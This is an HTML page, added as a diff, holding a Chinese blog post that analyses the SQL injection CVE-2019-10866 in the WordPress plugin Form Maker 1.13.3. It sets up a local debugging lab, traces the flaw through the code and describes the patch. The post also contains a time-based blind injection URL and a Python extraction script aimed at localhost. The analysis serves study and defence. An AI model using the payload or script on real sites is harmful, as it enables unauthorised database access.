@@ -1,0 +1,514 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Form Maker 1.13.3 SQL注入分析（CVE-2019-10866） - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Form Maker 1.13.3 SQL注入分析（CVE-2019-10866）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-07-15 15:02" pubdate>
+        2019年7月15日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      23
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Form Maker 1.13.3 SQL注入分析（CVE-2019-10866）</h1>
+            
+            <div class="markdown-body">
+              <p>对<code>WordPress</code>插件<code>Form Maker 1.13.3</code>SQL注入漏洞(CVE-2019-10866)的分析。<br>本文首发<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5637">先知社区</a></p>
+<a id="more"></a>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在复习<code>SQL注入</code>的一些知识，对于<code>order by</code>后面的注入遇到的不是很多，正好五月底<code>WordPress</code>的一个表单生成器插件出了一个<code>SQL注入</code>漏洞，恰好是<code>order by</code>的问题，于是拿来分析一波。如有错误，还望师傅们批评指正。</p>
+<h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><p>运行环境很简单，只是在<code>vulapps</code>的基础环境的上加了<code>xdebug</code>调试插件，把<code>docker</code>容器作为远程服务器来进行调试。<br><code>Dockerfile</code>文件:</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">FROM</span> medicean/vulapps:base_lamp_php7<br><br>RUN pecl install xdebug<br><br><span class="hljs-keyword">COPY</span> php.ini <span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/7.0/</span>apache2/<br><span class="hljs-keyword">COPY</span> php.ini <span class="hljs-regexp">/etc/</span>php<span class="hljs-regexp">/7.0/</span>cli/<br></code></pre></td></tr></table></figure>
+<p><code>docker-compose</code>文件:</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-symbol">services:</span><br>  lamp-php7:<br><span class="hljs-symbol">    build:</span> .<br><span class="hljs-symbol">    ports:</span><br>      - <span class="hljs-string">&quot;80:80&quot;</span><br><span class="hljs-symbol">    volumes:</span><br>      - <span class="hljs-string">&quot;/Users/mengchen/Security/Code Audit/html:/var/www/html&quot;</span><br>      - <span class="hljs-string">&quot;/Users/mengchen/Security/Code Audit/tmp:/tmp&quot;</span><br></code></pre></td></tr></table></figure>
+<p><code>php.ini</code>中<code>xdebug</code>的配置</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[xdebug]</span><br><span class="hljs-attr">zend_extension</span>=<span class="hljs-string">&quot;/usr/lib/php/20151012/xdebug.so&quot;</span><br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.remote_host</span>=<span class="hljs-number">10.254</span>.<span class="hljs-number">254.254</span><br><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9000</span><br><span class="hljs-attr">xdebug.remote_connect_back</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">xdebug.profiler_enable</span>=<span class="hljs-number">0</span><br><span class="hljs-attr">xdebug.idekey</span>=PHPSTORM<br><span class="hljs-attr">xdebug.remote_log</span>=<span class="hljs-string">&quot;/tmp/xdebug.log&quot;</span><br></code></pre></td></tr></table></figure>
+<p>因为我是在<code>Mac</code>上，所以要给本机加一个<code>IP</code>地址，让<code>xdebug</code>能够连接。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ifconfig lo<span class="hljs-number">0</span> alias <span class="hljs-number">10.254.254.254</span><br></code></pre></td></tr></table></figure>
+<p><code>PHPStorm</code>也要配置好相对路径:</p>
+<p><img src="https://image.mengsec.com/cve/20190710002400.png" srcset="/img/loading.gif"></p>
+<p>插件下载地址:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>downloads.wordpress.org<span class="hljs-regexp">/plugin/</span>form-maker.<span class="hljs-number">1.13</span>.<span class="hljs-number">3</span>.zip<br></code></pre></td></tr></table></figure>
+<p><code>WordPress</code>使用最新版就可以，在这里我使用的版本是<code>5.2.2</code>，语言选的简体中文。</p>
+<p>PS: <code>WordPress</code>搭建完毕后，记得关闭自动更新。</p>
+<h2 id="2-POC"><a href="#2-POC" class="headerlink" title="2. POC"></a>2. POC</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/wp-<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span>.php?page=submissions_fm&amp;task=display&amp;current_id=<span class="hljs-number">2</span>&amp;order_by=group_id&amp;asc_or_desc=,(<span class="hljs-keyword">case</span>+<span class="hljs-keyword">when</span>+(<span class="hljs-keyword">select</span>+ascii(substring(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))%<span class="hljs-number">3</span>d114+<span class="hljs-keyword">then</span>+(<span class="hljs-keyword">select</span>+sleep(<span class="hljs-number">5</span>)+<span class="hljs-keyword">from</span>+wp_users+<span class="hljs-keyword">limit</span>+<span class="hljs-number">1</span>)+<span class="hljs-keyword">else</span>+<span class="hljs-number">2</span>+<span class="hljs-keyword">end</span>)+<span class="hljs-keyword">asc</span>%<span class="hljs-number">3</span>b<br></code></pre></td></tr></table></figure>
+<p><code>Python</code>脚本，修改自<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46958">exploit-db</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>vul_url = <span class="hljs-string">&quot;http://127.0.0.1/wp-admin/admin.php?page=submissions_fm&amp;task=display&amp;current_id=2&amp;order_by=group_id&amp;asc_or_desc=&quot;</span><br>S = requests.Session()<br>S.headers.update(&#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,en;q=0.8,zh;q=0.5,en-US;q=0.3&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1/wp-login.php?loggedout=true&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;)<br>length = <span class="hljs-number">0</span><br>TIME = <span class="hljs-number">3</span><br>username = <span class="hljs-string">&quot;admin&quot;</span><br>password = <span class="hljs-string">&quot;admin&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">username, password</span>):</span><br>    data = &#123;<br>        <span class="hljs-string">&quot;log&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <br>        <span class="hljs-string">&quot;pwd&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <br>        <span class="hljs-string">&quot;wp-submit&quot;</span>: <span class="hljs-string">&quot;\xe7\x99\xbb\xe5\xbd\x95&quot;</span>, <br>        <span class="hljs-string">&quot;redirect_to&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1/wp-admin/&quot;</span>, <br>        <span class="hljs-string">&quot;testcookie&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>        &#125;<br>    r = S.post(<span class="hljs-string">&#x27;http://127.0.0.1/wp-login.php&#x27;</span>, data=data, cookies = &#123;<span class="hljs-string">&quot;wordpress_test_cookie&quot;</span>: <span class="hljs-string">&quot;WP+Cookie+check&quot;</span>&#125;)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span>():</span><br>    flag = <span class="hljs-literal">True</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> flag:<br>        flag = <span class="hljs-literal">False</span><br>        tmp_ascii = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">ascii</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>            tmp_ascii = <span class="hljs-built_in">ascii</span><br>            start_time = time.time()<br>            payload = <span class="hljs-string">&quot;&#123;vul_url&#125;,(case+when+(select+ascii(substring(user(),&#123;length&#125;,1)))%3d&#123;ascii&#125;+then+(select+sleep(&#123;TIME&#125;)+from+wp_users+limit+1)+else+2+end)+asc%3b&quot;</span>.<span class="hljs-built_in">format</span>(vul_url=vul_url, <span class="hljs-built_in">ascii</span>=<span class="hljs-built_in">ascii</span>, TIME=TIME, length=length)<br>            <span class="hljs-comment">#print(payload)</span><br>            r = S.get(payload)<br>            tmp = time.time() - start_time<br>            <span class="hljs-keyword">if</span> tmp &gt;= TIME:<br>                flag = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag:<br>            data += <span class="hljs-built_in">chr</span>(tmp_ascii)<br>            length += <span class="hljs-number">1</span><br>        print(data)<br>login(username, password)<br>attack()<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/cve/20190710105902.png" srcset="/img/loading.gif"></p>
+<h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3. 漏洞分析"></a>3. 漏洞分析</h2><h3 id="3-1-漏洞利用流程分析"><a href="#3-1-漏洞利用流程分析" class="headerlink" title="3.1 漏洞利用流程分析"></a>3.1 漏洞利用流程分析</h3><p>根据<code>POC</code>，我们很容易知道，注入点在参数<code>asc_or_desc</code>上，根据它的命名，极有可能是<code>order by</code>之后的注入。<br>首先大致浏览下插件目录下的文件结构:</p>
+<p><img src="https://image.mengsec.com/cve/20190709202328.png" srcset="/img/loading.gif"></p>
+<p>很经典的<code>MVC</code>架构，但是有点无从下手，还是从<code>POC</code>出发吧，</p>
+<p>首先全局搜索字符串<code>asc_or_desc</code>，根据传入的参数<code>page=submissions_fm&amp;task=display</code>，以及我们搜索到的结果，可以猜测，<code>submissions_fm</code>就是指代的调用的插件文件，<code>display</code>就是要调用的方法。</p>
+<p><img src="https://image.mengsec.com/cve/20190709205412.png" srcset="/img/loading.gif"></p>
+<p>在这里下一个断点验证一下。</p>
+<p>根据函数调用栈，我们很容易就能知道，在<code>form-maker.php:502, WDFM-&gt;form_maker()</code>处，代码将<code>FMControllerSubmissions_fm</code>进行了实例化，然后调用了它的<code>execute()</code>方法。</p>
+<p><img src="https://image.mengsec.com/cve/20190709211032.png" srcset="/img/loading.gif"></p>
+<p>接下来就进入了<code>Submissions_fm.php:93, FMControllerSubmissions_fm-&gt;execute()</code></p>
+<p><img src="https://image.mengsec.com/cve/20190709211939.png" srcset="/img/loading.gif"></p>
+<p>获取传入的<code>task</code>和<code>current_id</code>，动态调用<code>FMControllerSubmissions_fm</code>类的方法<code>display</code>，并将<code>current_id</code>的值作为参数传入。</p>
+<p>后面依次进入了<code>model</code>类<code>FMModelSubmissions_fm</code>中的<code>get_forms()</code>，<code>get_statistics();</code>和<code>blocked_ips()</code>方法，分别跟进之后并没有发现调用<code>asc_or_desc</code>参数。</p>
+<p>继续往下，进入类<code>FMModelSubmissions_fm</code>中<code>get_labels_parameters</code>方法。<br>路径:<code>wp-content/plugins/form-maker/admin/models/Submissions_fm.php:93</code></p>
+<p><img src="https://image.mengsec.com/cve/20190710115624.png" srcset="/img/loading.gif"></p>
+<p>到了第<code>133</code>行:</p>
+<p><img src="https://image.mengsec.com/cve/20190709214536.png" srcset="/img/loading.gif"></p>
+<p>代码从这里获取了传入的<code>asc_or_desc</code>的值，并将其存入了<code>$asc_or_desc</code>变量中。</p>
+<p>跟进一下，看一看代码对其进行了怎样的处理。</p>
+<p>路径:<code>wp-content/plugins/form-maker/framework/WDW_FM_Library.php:367</code></p>
+<p><img src="https://image.mengsec.com/cve/20190709215849.png" srcset="/img/loading.gif"></p>
+<p>根据传入的键值<code>asc_or_desc</code>，动态调用<code>$_GET[$key]</code>，把值存入<code>$value</code>中，然后传入了静态私有方法<code>validate_data()</code>中</p>
+<p>继续跟进，在第<code>395</code>行</p>
+<p><img src="https://image.mengsec.com/cve/20190709220330.png" srcset="/img/loading.gif"></p>
+<p>使用<code>stripslashes()</code>函数去除了<code>value</code>中的反斜杠，又因为<code>$esc_html</code>为<code>true</code>，进入了<code>esc_html</code></p>
+<p>在<a target="_blank" rel="noopener" href="https://developer.wordpress.org/reference/functions/esc_html/">WordPress手册</a>中，可以查到它的作用是将传入的值转义为<code>HTML</code>块。</p>
+<p>跟进一下，我们可以看到代码调用了两个<code>WordPress</code>的内置方法对传入的<code>value</code>值进行了处理<br>路径<code>wp-includes/formatting.php:4348</code></p>
+<p><img src="https://image.mengsec.com/cve/20190709221724.png" srcset="/img/loading.gif"></p>
+<p>从<code>WordPress</code>手册中，能查到<code>_wp_specialchars</code>是对<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>和<code>&#39;</code>进行了<code>HTML</code>实体编码。</p>
+<p><img src="https://image.mengsec.com/cve/20190709220810.png" srcset="/img/loading.gif"></p>
+<p>可以知道，在获取<code>asc_or_desc</code>参数的过程中，只过滤了<code>\</code>、<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>和<code>&#39;</code>。</p>
+<p>然后回到<code>get_labels_parameters</code>接着往下看。</p>
+<p>在第<code>161</code>行，因为传入的<code>$order_by == group_id</code>满足条件，成功将<code>$asc_or_desc</code>，拼接到了变量<code>$orderby</code>中。</p>
+<p><img src="https://image.mengsec.com/cve/20190709233336.png" srcset="/img/loading.gif"></p>
+<p>后面虽然有一些查询操作，但是都没有拼接<code>$orderby</code>，也没有对其做进一步的过滤处理。<br>导致在第<code>311</code>行，<code>Payload</code>拼接进入了<code>SQL</code>语句，然后在<code>312</code>行进行了数据库查询操作。</p>
+<p><img src="https://image.mengsec.com/cve/20190709234313.png" srcset="/img/loading.gif"></p>
+<p>看一下数据库的日志也能看到，执行了<code>SQL</code>语句:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">distinct</span> group_id <span class="hljs-keyword">FROM</span> wp_formmaker_submits <span class="hljs-keyword">WHERE</span>  form_id<span class="hljs-operator">=</span><span class="hljs-number">2</span>  <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> group_id ,(<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-keyword">select</span> ascii(<span class="hljs-built_in">substring</span>(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">114</span> <span class="hljs-keyword">then</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">from</span> wp_users limit <span class="hljs-number">1</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">2</span> <span class="hljs-keyword">end</span>) <span class="hljs-keyword">asc</span>;<br></code></pre></td></tr></table></figure>
+<p>在<code>mysql</code>中执行一下，由于<code>when</code>后面的条件成立，语句中的<code>sleep(5)</code>生效了。</p>
+<p><img src="https://image.mengsec.com/cve/20190709235501.png" srcset="/img/loading.gif"></p>
+<p>到这里，整个<code>POC</code>的执行流程我们就看完了。</p>
+<h3 id="3-2-漏洞原理分析"><a href="#3-2-漏洞原理分析" class="headerlink" title="3.2 漏洞原理分析"></a>3.2 漏洞原理分析</h3><p>简单总结一下，我们传入参数<code>?page=submissions_fm&amp;task=display</code>，让代码走到了存在漏洞的方法<code>get_labels_parameters</code>中。</p>
+<p><img src="https://image.mengsec.com/cve/20190710204505.png" srcset="/img/loading.gif"></p>
+<p>而方法<code>get_labels_parameters</code>中，在获取参数<code>asc_or_desc</code>的值的过程中，基本没有进行过滤，就将其拼接进入了<code>SQL</code>语句中，并执行，导致了<code>SQL</code>注入。</p>
+<p><img src="https://image.mengsec.com/cve/20190710212706.png" srcset="/img/loading.gif"></p>
+<h2 id="4-补丁分析"><a href="#4-补丁分析" class="headerlink" title="4. 补丁分析"></a>4. 补丁分析</h2><p>我们将1.13.3版本的插件卸载掉，安装一下<a target="_blank" rel="noopener" href="https://downloads.wordpress.org/plugin/form-maker.1.13.4.zip">1.13.4</a>版本，查看一下是如何修复的。</p>
+<p>路径:<code>wp-content/plugins/form-maker/admin/models/Submissions_fm.php:133</code></p>
+<p><img src="https://image.mengsec.com/cve/20190710214826.png" srcset="/img/loading.gif"></p>
+<p>简单粗暴，限制了<code>asc_or_desc</code>的值只能为<code>desc</code>和<code>asc</code>其中的一个。</p>
+<h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46958">https://www.exploit-db.com/exploits/46958</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.wordpress.org/">https://developer.wordpress.org/</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/08/04/use-burp-grab-netease-mumu-packets/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">踩坑记录——使用Burp抓取网易MuMu的数据包</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/06/20/php-trick-weak-type/">
+                        <span class="hidden-mobile">PHP黑魔法深度剖析（一）——PHP的弱类型比较</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
